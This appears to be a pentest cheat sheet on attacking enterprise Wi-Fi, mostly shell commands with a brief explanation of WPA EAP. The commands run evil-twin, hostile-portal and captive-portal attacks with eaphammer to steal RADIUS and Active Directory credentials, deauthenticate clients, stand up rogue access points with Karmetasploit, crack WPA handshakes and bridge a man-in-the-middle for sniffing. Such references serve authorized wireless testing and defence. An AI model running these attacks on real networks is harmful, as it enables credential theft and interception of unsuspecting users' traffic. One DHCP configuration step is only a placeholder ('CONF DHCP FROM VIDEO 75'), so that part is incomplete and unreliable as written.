# Wifi - Enterprise Network

## WPA and WPA2 EAP

WPA EAP refers to the use of the Extensible Authentication Protocol (EAP) within the context of the Wi-Fi Protected Access (WPA) security standard for wireless networks. WPA is a suite of security protocols to secure wireless local area networks (WLANs) and is a response to the vulnerabilities of the older Wired Equivalent Privacy (WEP) standard. WPA EAP is specifically associated with the enterprise mode of WPA, which uses 802.1X authentication to provide a higher level of security compared to the personal mode of WPA, which uses a pre-shared key (PSK).


* [s0lst1c3/eaphammer](https://github.com/s0lst1c3/eaphammer) - Targeted evil twin attacks against WPA2-Enterprise networks.
    ```ps1
    git clone https://github.com/s0lst1c3/eaphammer.git
    ./kali-setup

    # generate certificates
    ./eaphammer --cert-wizard

    # launch attack
    ./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds

    # deauth users and wait for them to connect to our AP
    aireplay-ng -0 0 -a MAC_ADDR_AP -c MAC_ADDR_CIBLE wlan0mon
    ```

* [Stealing RADIUS Credentials Using EAPHammer](https://github.com/s0lst1c3/eaphammer/wiki/II.-Stealing-RADIUS-Credentials-Using-EAPHammer)
    ```ps1
    ./eaphammer --bssid 1C:7E:E5:97:79:B1 --essid Example --channel 2 --interface wlan0 --auth wpa-eap --creds
    ```

* [Stealing AD Credentials Using Hostile Portal Attacks](https://github.com/s0lst1c3/eaphammer/wiki/III.-Stealing-AD-Credentials-Using-Hostile-Portal-Attacks)
    ```ps1
    ./eaphammer --interface wlan0 --bssid 1C:7E:E5:97:79:B1 --essid EvilC0rp --channel 6 --auth wpa-eap --hostile-portal
    ./eaphammer --interface wlan0 --essid TotallyLegit --hw-mode n --channel 36 --auth open --hostile-portal
    ```

* [Performing Captive Portal Attacks - Evil Twin Attacks](https://github.com/s0lst1c3/eaphammer/wiki/V.-Performing-Captive-Portal-Attacks)
    ```ps1
    ./eaphammer --bssid 1C:7E:E5:97:79:B1 --essid HappyMealz --channel 149 --interface wlan0 --captive-portal
    ./eaphammer --captive-portal -e guestnet -i wlan0 --portal-template rogue-cert-prompt --lhost 10.0.0.10 --payload secure.crt
    ```


## Rogue Access Point

### WPA handshake

```powershell
airmon-ng start wlan0 3
airodump-ng -c 3 -d $ATTACKER_MAC -w airbase mon0

# basic fake AP
airbase-ng -c 3 -e $AP_SSID mon0
airbase-ng -c 3 -e $AP_SSID -z 4 -W 1 mon0
-W 1 : WEP

# get a WPA handshake if the client connect
aircrack-ng -w /pentest/passwords/john/password.lst airbase-01.cap
```


### Karmetasploit

```powershell
# install a dhcp server
apt install dhcp3-server

airmon-ng start wlan0 3
airbase-ng -c 3 -P -C 60 -e $AP_MAC -v mon0
-P: respond to all probes
ifconfig at0 up 10.0.0.1/24

mkdir -p /var/run/dhcpd
chown -R dhcpd:dhcpd /var/run/dhcpd
touch /var/lib/dhcp3/dhcpd.leases

"CONF DHCP FROM VIDEO 75" > /tmp/dhcpd.conf

touch /tmp/dhcp.log
chown -R dhcpd:dhcpd /tmp/dhcp.log
dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcp/log at0

karma.rc from metasploit
# comment the first 2 lines (load sqlite)
msfconsole -r /root/karma.rc
```


### Access Point MITM

```powershell
airmon-ng start wlan0 3
airbase-ng -c 3 -e $AP_SSID_SPOOFED mon0

# create a bridged interface
# apt-get install bridge-utils
brctl addbr hacker
brctl addif hacker eth0
brctl addif hacker at0

# assign IP addresses
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig hacker 192.168.1.8 up

# enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# mitm tools
driftnet
ettercap -G
Sniff > Unified sniffing > Hacker Interface
```


## References

* [Retex : Test d’intrusion Wi-Fi (WPA2-Enterprise) - @virtualsamuraii](https://virtualsamuraii.github.io/network/retex-pentest-wifi-wpa2-enterprise/)